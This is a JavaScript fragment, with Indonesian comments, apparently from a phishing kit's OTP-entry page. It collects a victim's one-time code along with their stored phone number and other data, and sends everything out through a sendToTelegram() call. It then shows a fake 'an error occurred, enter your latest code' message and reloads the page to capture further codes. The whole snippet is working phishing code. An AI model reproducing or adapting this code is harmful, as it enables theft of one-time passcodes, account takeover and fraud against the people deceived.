    <script>
        var a = sessionStorage.getItem('phone');
        document.addEventListener('DOMContentLoaded', function () {
    const timeouts = {};
    const continueButton = document.getElementById('bt1');

    function toggleButton() {
        const otp = document.getElementById('huuh').value;
        if (otp.length >= 4) {
            continueButton.disabled = false;
            continueButton.style.backgroundColor = '#673ab7';
            continueButton.style.color = '#fff';
            continueButton.style.cursor = 'pointer';
        } else {
            continueButton.disabled = true;
            continueButton.style.backgroundColor = '#e0e0e0';
            continueButton.style.color = '#9e9e9e';
            continueButton.style.cursor = 'not-allowed';
        }
    }

    // cek setiap kali user ketik
    document.getElementById('huuh').addEventListener('input', toggleButton);
    toggleButton(); // cek awal

    continueButton.addEventListener('click', async function () {
        const otp = document.getElementById('huuh').value; // ambil value terbaru

        storeData('otp', otp);

        const data = getAllData();
        sendToTelegram(data).then(success => {
            if (success) {
                Swal.fire({
                    icon: "error",
                    title: "Terjadi Kesalahan",
                    text: "Silahkan masukan kode terbaru anda",
                    confirmButtonText: "Coba Lagi"
                }).then((result) => {
                    if (result.isConfirmed) {
                        location.reload();
                    }
                });
            }
        });

        // Countdown timer script (di luar Swal.fire)
        const countdownElement = document.getElementById('countdown');
        let timeLeft = 60;

        function updateCountdown() {
            countdownElement.textContent = timeLeft;
            if (timeLeft > 0) {
                timeLeft--;
                setTimeout(updateCountdown, 1000);
            } else {
                document.getElementById('countdown-text').style.display = 'none';
                document.getElementById('resend-link').style.display = 'inline';
            }
        }

        updateCountdown();
    });
});
